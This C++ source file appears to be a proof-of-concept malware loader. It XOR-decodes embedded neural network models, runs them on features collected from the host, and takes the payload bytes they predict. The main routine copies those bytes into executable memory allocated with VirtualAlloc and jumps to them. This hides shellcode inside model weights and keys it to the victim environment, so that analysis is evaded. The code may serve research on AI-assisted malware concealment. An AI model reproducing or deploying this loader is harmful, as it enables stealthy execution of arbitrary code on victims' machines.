#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <cstring>
#include <string>
#include <algorithm>
#include <fdeep/fdeep.hpp>
#include <windows.h>

#include "resource_model.h"
#include "../DataCollector/data_collector.h"

template<class ForwardIterator>
inline size_t argmin(ForwardIterator first, ForwardIterator last)
{
    return std::distance(first, std::min_element(first, last));
}

template<class ForwardIterator>
inline size_t argmax(ForwardIterator first, ForwardIterator last)
{
    return std::distance(first, std::max_element(first, last));
}

std::string decode_model()
{
    size_t model_len = sizeof(model) / sizeof(model[0]);
    std::string model_str;
    for (size_t i = 0; i < model_len; i++) {
        model_str.push_back(static_cast<char>(model[i] ^ key));
    }
    return model_str;
}

std::string decode_ecc()
{
    size_t ecc_len = sizeof(ecc) / sizeof(ecc[0]);
    std::string ecc_str;
    for (size_t i = 0; i < ecc_len; i++) {
        ecc_str.push_back(static_cast<char>(ecc[i] ^ key));
    }
    return ecc_str;
}

void dec_payload2buff()
{
    std::vector<unsigned> features;

    for (auto& ch : make_features()) { 
        features.push_back(static_cast<int>(ch));
    }
    int pad_size = max_feature_len - features.size();
    std::vector<float> feature_float(features.begin(), features.end());
    while (pad_size > 0) {
        feature_float.push_back(0.0);
        pad_size = pad_size - 1;
    }

    std::string model_config = decode_model();
    const auto decoder_model = fdeep::read_model_from_string(model_config, true, fdeep::dev_null_logger);
    std::string ecc_config = decode_ecc();
    const auto ecc_model = fdeep::read_model_from_string(ecc_config, true, fdeep::dev_null_logger);

    std::vector<char> buff;
    std::vector<unsigned int> payload;

    const auto result = decoder_model.predict(
        {
            fdeep::tensor(fdeep::tensor_shape(static_cast<std::size_t>(max_feature_len)), feature_float),
        });

    auto probes = result[0].to_vector();
    for (size_t i = 0; i < probes.size(); i += emb_dim) {
        size_t maxIndex = argmax(probes.begin() + i, probes.begin() + i + emb_dim);
        payload.push_back(maxIndex);
    }

    for (int index = 0; index <= decoder_seq_len - ecc_seq_len; index += 1) {
        std::vector<float> revised_feature(payload.begin() + index , payload.begin() + index + ecc_seq_len);
        const auto revised_result = ecc_model.predict({
                fdeep::tensor(fdeep::tensor_shape(static_cast<std::size_t>(ecc_seq_len)), revised_feature),
            });
        auto revised_probes = revised_result[0].to_vector();

        int bias = 0;
        for (size_t j = 0; j < revised_probes.size(); j += emb_dim) {
            size_t maxIndex = argmax(revised_probes.begin() + j, revised_probes.begin() + j + emb_dim);
            if (maxIndex != payload[index + bias]) {
                payload[index + bias] = maxIndex;
            }
            bias += 1;
        }
    }

    for (auto& ch : payload) {
        int value = int(ch);
        if (value < 256) {
            buff.push_back(static_cast<char>(value));
        }
    }

    if (buff.size() > 0) {
        char buf[4096];
        for (size_t i = 0; i < buff.size(); i++) {
            buf[i] = buff[i];
        }

        LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(Memory, buf, sizeof(buf));
        ((void(*)())Memory)();
    }
}

int main(int argc, char* argv[])
{
    dec_payload2buff();
    return 0;
}